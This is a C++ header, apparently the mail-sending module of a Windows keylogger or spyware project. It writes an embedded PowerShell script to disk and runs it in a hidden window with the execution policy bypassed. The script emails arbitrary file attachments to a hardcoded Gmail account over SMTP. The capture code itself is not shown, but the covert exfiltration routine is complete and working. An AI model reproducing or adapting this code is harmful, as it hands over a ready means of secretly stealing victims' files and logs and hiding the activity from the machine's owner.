#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"


namespace Mail
{
#define X_EM_TO "@gmail.com"
#define X_EM_FROM "@gmail.com"
#define X_EM_PASS ""

const std::string &PowerShellScript = 
	"Param([String]$Att,[String]$Subj,[String]$Bod)\n"
	"Function Send-Email{Param(\n"
	"[Parameter(Mandatory=$true)][String]$To,\n"
	"[Parameter(Mandatory=$true)][String]$From,\n"
	"[Parameter(Mandatory=$true)][String]$Password,\n"
	"[Parameter(Mandatory=$true)][String]$Subject,\n"
	"[Parameter(Mandatory=$true)][String]$Body,\n"
	"[Parameter(Mandatory=$true)][String]$Attachment)\n"
	"try{$Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\n"
	"$Srv = \"smtp.gmail.com\"\n"
	"if ($Attachment -ne $null){\n"
	"try{$Attachments = $Attachment -split (\"\\:\\:\");\n"
	"ForEach ($val in $Attachments){\n"
	"$attach = New-Object System.Net.Mail.Attachment($val)\n"
	"$Msg.Attachments.Add($attach)}}catch{exit 2;}\n"
	"$Client = New-Object Net.Mail.SmtpClient($Srv, 587);$Client.EnableSsl = $true\n"
	"$Client.Credentials = New-Object System.Net.NetworkCredential($From.Split(\"@\")[0], $Password)\n"
	"$Client.Send($Msg)\n"
	"Remove-Variable -Name Client;Remove-Variable -Name Password\n"
	"exit 7;}}catch{exit 3;}}\n"
	"try{Send-Email -Attachment $Att -To \"" + std::string(X_EM_TO) +
	"\" -Subject $Subj `\n"
	"-Body $Bod -Password \"" + std::string(X_EM_PASS) +
	"\" -From \"" + std::string(X_EM_FROM) + "\"\n"
	"}catch{exit 4;}\n";

#undef X_EM_TO
#undef X_EM_FROM
#undef X_EM_PASS

	std::string StringReplace(std::string s, const std::string &what, const std::string &with)
	{
		if (what.empty())
			return s;
		size_t sp = 0;
		while ((sp = s.find(what, sp)) != std::string::npos)
			s.replace(sp, what.length(), with), sp += with.length();
		return s;
	}

	bool CheckFileExists(const std::string &f)
	{
		std::ifstream file(f);
		return (bool)file;
	}

	bool CreateScript()
	{
		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
		if (!script)
			return false;
		script << PowerShellScript;
		if (!script)
			return false;
		script.close();
		return true;
	}

	Timer mTimer;

	int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
	{
		bool ok;
		ok = IO::MkDir(IO::GetOurPath(true));
		if (!ok)
			return -1;
		std::string script_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
		if (!CheckFileExists(script_path))
			ok = CreateScript();
		if (!ok)
			return -2;

		std::string param =
			"-ExecutionPolicy ByPass -File \"" +
			script_path + "\" -Subj \"" +
			StringReplace(subject, "\"", "\\\"") + "\" -Bod \"" +
			StringReplace(body, "\"", "\\\"") + "\" -Att \"" +
			attachments + "\"";

		SHELLEXECUTEINFO ShExecInfo = {0};
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open";
		ShExecInfo.lpFile = "powershell";
		ShExecInfo.lpParameters = param.c_str();
		ShExecInfo.lpDirectory = NULL;
		ShExecInfo.nShow = SW_HIDE;
		ShExecInfo.hInstApp = NULL;

		ok = (bool)ShellExecuteEx(&ShExecInfo);
		if (!ok)
			return -3;

		WaitForSingleObject(ShExecInfo.hProcess, 7000);
		DWORD exit_code = 100;
		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
		mTimer.setFunction([&]() {
			WaitForSingleObject(ShExecInfo.hProcess, 60000);
			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
			if ((int)exit_code == STILL_ACTIVE)
				TerminateProcess(ShExecInfo.hProcess, 100);
			Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
		});

		mTimer.setRepeatMaxNum(1L);
		mTimer.setInterval(10L);
		mTimer.start(true);
		return (int)exit_code;
	}

	int SendMail(const std::string &subject, const std::string &body,
				 const std::vector<std::string> &att)
	{
		std::string attachments;
		if (att.size() == 1U)
			attachments = att.at(0);
		else
		{
			for (const auto &a : att)
				attachments += a + "::";
			attachments = attachments.substr(0, attachments.length() - 2);
		}
		return SendMail(subject, body, attachments);
	}
}
#endif /* SENDMAIL_H */